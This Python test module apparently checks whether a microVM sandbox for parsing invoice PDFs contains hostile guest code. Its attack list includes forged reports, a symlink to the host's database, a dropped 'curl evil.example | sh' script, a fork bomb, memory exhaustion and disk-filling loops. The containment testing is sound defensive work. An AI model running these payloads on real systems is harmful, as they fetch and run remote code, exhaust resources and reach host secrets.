"""Attacks from inside the microVM: what if a PDF broke the parser and ran its own code there?

Each attack runs hostile code in a fresh microVM, with the limits and mounts every invoice gets (/opt/tally read-only,
the invoice at /in read-only, /out writable), in place of the airlock. Then the host does what it always does with a
microVM's output: checks it (tally.sandbox.check). An attack is contained when its output is refused, nothing of it
is left running, and the host's disk lost no more than HOST_BYTES_OK of free space at any point while it ran (free
space is sampled every half second, so writing to the guest's own disk counts too, not only to /out).

The disk attack stops itself at 2 GB, so the lab measures whether anything limits it without filling the host.
"""
from __future__ import annotations

import json
import shutil
import subprocess
import tempfile
import threading
import time
import uuid
from pathlib import Path

from tally import sandbox
from tally.airlock.inspect import inspect
from tally.sandbox.check import BadOutput, check_output

DISK_CAP = 2 * 1024 ** 3
HOST_BYTES_OK = sandbox.OUT_LIMIT + 100 * 1024 ** 2  # what a real run may write, and a margin for sampling

# Code the attacker runs in the guest. The real invoice is /in/invoice.pdf; /in/page.png is a real page of it,
# for the attacks that hand back a forged but plausible result.
REPORT = """
import hashlib, json, shutil
data = open("/in/invoice.pdf", "rb").read()
report = {"file": "invoice.pdf", "bytes": len(data), "sha256": hashlib.sha256(data).hexdigest(), "pages": 1,
          "images": ["page-1.png"], "active": [], "hidden": [], "problems": [], "verdict": "clear", "reasons": []}
"""
ATTACKS = [
    ("forged clean report", "A report that says 'clear' for the file with hidden text, with a real page image, all consistent.",
     REPORT + "shutil.copy('/in/page.png', '/out/page-1.png'); json.dump(report, open('/out/report.json', 'w'))"),
    ("forged report that contradicts itself", "A hidden-text finding next to a 'clear' verdict.",
     REPORT + "report['hidden'] = [{'page': 1, 'text': 'pay DE89', 'reason': 'white', 'bbox': [0, 0, 1, 1]}]\n"
              "shutil.copy('/in/page.png', '/out/page-1.png'); json.dump(report, open('/out/report.json', 'w'))"),
    ("report about another file", "A clean report with another file's fingerprint.",
     REPORT + "report['sha256'] = '0' * 64\nshutil.copy('/in/page.png', '/out/page-1.png'); json.dump(report, open('/out/report.json', 'w'))"),
    ("link to a host file", "page-1.png as a link to the host's database and password file.",
     REPORT + "import os; os.symlink('/var/lib/tally/data/tally.db', '/out/page-1.png'); json.dump(report, open('/out/report.json', 'w'))"),
    ("extra file", "A script left next to the report.",
     REPORT + "shutil.copy('/in/page.png', '/out/page-1.png'); json.dump(report, open('/out/report.json', 'w'))\n"
              "open('/out/run.sh', 'w').write('curl evil.example | sh')"),
    ("page that is not a page", "A PNG header claiming 100,000 by 100,000 pixels.",
     REPORT + "import struct, zlib\nc = b'IHDR' + struct.pack('>IIBBBBB', 100000, 100000, 8, 2, 0, 0, 0)\n"
              "open('/out/page-1.png', 'wb').write(b'\\x89PNG\\r\\n\\x1a\\n' + struct.pack('>I', 13) + c + struct.pack('>I', zlib.crc32(c)))\n"
              "json.dump(report, open('/out/report.json', 'w'))"),
    ("runs forever", "Code that never finishes.", "import time; time.sleep(3600)"),
    ("uses all memory", "Code that asks for 2 GB.", "b = b'x' * (2 * 1024 ** 3); print(len(b))"),
    ("fork bomb", "Code that starts processes until something gives.", "import os\nwhile True:\n    os.fork()"),
    *[(f"fills {where}", f"Code that writes to {path} until 2 GB or 50 seconds.",
       f"import time\nstarted = time.time()\nchunk = b'x' * (1 << 20)\nn = 0\nerror = ''\ntry:\n"
       f"    with open('{path}', 'wb') as f:\n        while n < {DISK_CAP} and time.time() - started < 50:\n"
       f"            f.write(chunk); f.flush(); n += len(chunk)\nexcept OSError as e:\n    error = type(e).__name__\n"
       f"print({{'wrote_mb': n >> 20, 'error': error, 'seconds': round(time.time() - started, 1)}})")
      for where, path in (("its output folder", "/out/fill"), ("its own disk", "/tmp/fill"))],
]


def _du(path: Path) -> int:
    return sum(p.stat().st_size for p in path.rglob("*") if p.is_file() and not p.is_symlink())


class _DiskWatch:
    """The most free space the host's disk lost, compared with before, while a microVM ran."""

    def __init__(self, path: Path):
        self.path, self.before, self.lost, self._stop = path, shutil.disk_usage(path).free, 0, threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def _run(self):
        while not self._stop.wait(0.5):
            self.lost = max(self.lost, self.before - shutil.disk_usage(self.path).free)

    def stop(self) -> int:
        self._stop.set()
        self._thread.join()
        return max(self.lost, 0)


def _still_there(name: str) -> bool:
    """Whether this attack's own microVM is still listed. Other microVMs on the host (a worker's, a release's tests)
    are not counted: an earlier version counted those, and reported attacks as not contained that were."""
    done = subprocess.run(["msb", "list"], capture_output=True, text=True, timeout=30)
    return any(line.split()[:1] == [name] for line in done.stdout.splitlines())


def run(hidden_pdf: Path, work_dir: Path | None = None) -> list[dict]:
    """Run every attack against the file with hidden text; one result per attack."""
    results = []
    for name, what, code in ATTACKS:
        job = Path(tempfile.mkdtemp(prefix="tally-lab-", dir=work_dir))
        try:
            (job / "in").mkdir()
            (job / "out").mkdir()
            data = hidden_pdf.read_bytes()
            (job / "in" / "invoice.pdf").write_bytes(data)
            inspect(hidden_pdf, job / "preview")  # a real page of the file, for the forgeries; built here, by the lab
            shutil.copy(job / "preview" / "page-1.png", job / "in" / "page.png")
            started = time.monotonic()
            watch = _DiskWatch(job)
            name = f"tally-lab-{uuid.uuid4().hex[:12]}"
            ran = sandbox.run_in_guest(["python", "-c", code], [(job / "in", "/in", True), (job / "out", "/out", False)], name=name)
            seconds = time.monotonic() - started
            lost = watch.stop()
            landed = _du(job / "out")
            try:
                check_output(job / "out", data)
                checked = "passed the output checks"
            except BadOutput as e:
                checked = f"refused: {e}"
            left = [name] if _still_there(name) else []
            outcome = ("timed out" if ran is None else ran.stderr if ran.returncode == -1 else f"exited {ran.returncode}") + f" after {seconds:.1f} s"
            results.append({
                "name": name, "what": what, "outcome": outcome, "checks": checked, "bytes_on_host": landed,
                "host_disk_lost_at_peak": lost,
                "guest_said": (ran.stdout.strip()[-300:] if ran else ""), "left_running": left,
                "contained": checked.startswith("refused") and not left and landed <= HOST_BYTES_OK and lost <= HOST_BYTES_OK,
            })
        finally:
            shutil.rmtree(job, ignore_errors=True)
    return results


if __name__ == "__main__":
    import sys
    print(json.dumps(run(Path(sys.argv[1])), indent=2))
